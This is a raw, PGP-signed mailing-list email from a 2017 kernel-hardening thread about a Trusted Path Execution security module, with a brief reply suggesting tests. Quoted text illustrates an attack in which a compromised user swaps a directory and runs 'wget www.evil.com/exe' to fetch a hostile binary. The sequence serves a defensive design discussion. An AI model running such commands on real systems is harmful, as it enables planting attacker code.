References: <20170608034349.31876-1-matt@nmatt.com>
 <20170608193719.2d9e8d17@lxorguk.ukuu.org.uk>
 <3f9e53a8-87d2-9773-d30b-64b89da8f3ff@nmatt.com>
From: =?UTF-8?Q?Micka=c3=abl_Sala=c3=bcn?= <mic@digikod.net>
Message-ID: <9d175249-c9f3-daba-bae4-f60dc97795e6@digikod.net>
Date: Sun, 11 Jun 2017 13:30:55 +0200
MIME-Version: 1.0
In-Reply-To: <3f9e53a8-87d2-9773-d30b-64b89da8f3ff@nmatt.com>
Content-Type: multipart/signed; micalg=pgp-sha512;
 protocol="application/pgp-signature";
 boundary="0gQc0HSIshrqfWCabpQL7d4D9jAUecf0P"
Subject: [kernel-hardening] Re: [PATCH v2 0/1] Add Trusted Path Execution as a stackable LSM
To: Matt Brown <matt@nmatt.com>, Alan Cox <gnomes@lxorguk.ukuu.org.uk>
Cc: james.l.morris@oracle.com, serge@hallyn.com, linux-kernel@vger.kernel.org, linux-security-module@vger.kernel.org, kernel-hardening@lists.openwall.com
List-ID: <kernel-hardening.lists.openwall.com>

This is an OpenPGP/MIME signed message (RFC 4880 and 3156)
--0gQc0HSIshrqfWCabpQL7d4D9jAUecf0P
Content-Type: multipart/mixed; boundary="9lxkVjVP4HviLsxpqEIAt4EPjcmlpaQ1p";
 protected-headers="v1"
From: =?UTF-8?Q?Micka=c3=abl_Sala=c3=bcn?= <mic@digikod.net>
To: Matt Brown <matt@nmatt.com>, Alan Cox <gnomes@lxorguk.ukuu.org.uk>
Cc: james.l.morris@oracle.com, serge@hallyn.com,
 linux-kernel@vger.kernel.org, linux-security-module@vger.kernel.org,
 kernel-hardening@lists.openwall.com
Message-ID: <9d175249-c9f3-daba-bae4-f60dc97795e6@digikod.net>
Subject: Re: [PATCH v2 0/1] Add Trusted Path Execution as a stackable LSM
References: <20170608034349.31876-1-matt@nmatt.com>
 <20170608193719.2d9e8d17@lxorguk.ukuu.org.uk>
 <3f9e53a8-87d2-9773-d30b-64b89da8f3ff@nmatt.com>
In-Reply-To: <3f9e53a8-87d2-9773-d30b-64b89da8f3ff@nmatt.com>

--9lxkVjVP4HviLsxpqEIAt4EPjcmlpaQ1p
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable


On 08/06/2017 21:01, Matt Brown wrote:
> On 6/8/17 2:37 PM, Alan Cox wrote:
>>> http://phrack.org/issues/52/6.html#article
>>>
>>> | A trusted path is one that is inside a root owned directory that
>>> | is not group or world writable.  /bin, /usr/bin, /usr/local/bin, ar=
e
>>> | (under normal circumstances) considered trusted.  Any non-root
>>> | users home directory is not trusted, nor is /tmp.
>>
>> Note that in the real world the trusted path would and should also
>> require that any elements of the path above that point are also locked=

>> down if you are using path based models. Ie you need to ensure nobody =
has
>> the ability to rename /usr or /usr/local before you trust /usr/local/b=
in.
>>
>=20
> So actually in this LSM it's not so much full paths that are trusted,
> rather it checks that the directory containing the program is only
> writable by root and that the program itself is only writable by root.
>=20
> For example, consider the following:
>=20
> /user/ with permissions drwxr-xr-x user user
> /user/user-owned/ with permissions drwxr-xr-x user user
> /user/user-owned/root-owned/ with permissions drwxr-xr-x root root
> /user/user-owned/root-owned/exe with permissions -rwxr-xr-x root root

Some tests would make this scenario clear. ;)

You can take a look at how seccomp-bpf does with the test_harness.h
helper. A new kselftest_harness.h will be available soon to not include
a file from the seccomp-bpf directory (cf. linux-next).

>=20
> currently /user/user-owned/root-owned/exe is trusted because it can onl=
y
> be written to by root, and the directory it is in can only be written b=
y
> root.
>=20
> but then user becomes compromised and does the following:
> cd /user/
> mv user-owned user-owned-back
> mkdir -p user-owned/root-owned
> cd user-owned/root-owned
> wget www.evil.com/exe
>=20
> Now /user/user-owned/root-owned/exe is untrusted and its execution will=

> be denied unless you put user in the trusted group.
>=20
> Matt
>=20


--9lxkVjVP4HviLsxpqEIAt4EPjcmlpaQ1p--

--0gQc0HSIshrqfWCabpQL7d4D9jAUecf0P
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEUysCyY8er9Axt7hqIt7+33O9apUFAlk9KfAACgkQIt7+33O9
apWLswf/QfyBdatf8019RqW0Ytp7d8MRbBlOYTxglyNhyhhm+ZrIf3SQWGjzOchO
jETOqaALX2hp4T3/Wkja4vvxOHQ/H+Lzv7MgvA+e2iVqE8aaCUThrXZv8bZHg5vz
n+nq6aAiUOzEWLmufKNx3PhCm+WYyl/dcq07/EBR0ghopWERdvrT/PxRiJjuzXAa
JHnRJRkDMhOZ6sMwOTTbAnKhtX/OmdgNNcHHcTvP102E8LK/ifWriH5DPVuVPhio
QORMRuErcaDG+60k+yZyQpz3jbEMb94ogqJJUBYZYkIBVlEOHzeAuIeorsNHqN45
WzG3j/Kqqsc1LyoRYLsL2FedPOtsPw==
=CetE
-----END PGP SIGNATURE-----

--0gQc0HSIshrqfWCabpQL7d4D9jAUecf0P--
